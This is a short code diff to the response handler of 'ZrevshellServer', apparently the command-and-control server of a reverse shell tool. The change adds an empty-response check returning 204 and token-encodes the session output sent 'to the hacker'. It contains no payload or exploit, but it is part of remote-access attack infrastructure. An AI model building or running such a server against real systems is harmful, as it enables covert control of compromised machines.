@@ -308,9 +308,16 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # If all's good let's fetch the response and send it to the hacker
         # with a beautiful OK response code.
-        response = js.dumps(
-            self.hacking_sessions.get_response(requested_session_id)
-        ).encode()
+
+        # Before that we need to check the response and if it is an
+        # empty response
+        raw_response = self.hacking_sessions.get_response(requested_session_id)
+
+        if len(raw_response) == 0:
+            # If there was no content
+            return sh.HandlerResponse(False, HTTPStatus.NO_CONTENT)
+
+        response = ut.encode_token(js.dumps(raw_response)).encode()
 
         return sh.HandlerResponse(
             True, HTTPStatus.OK, response, {"content-length": str(len(response))}
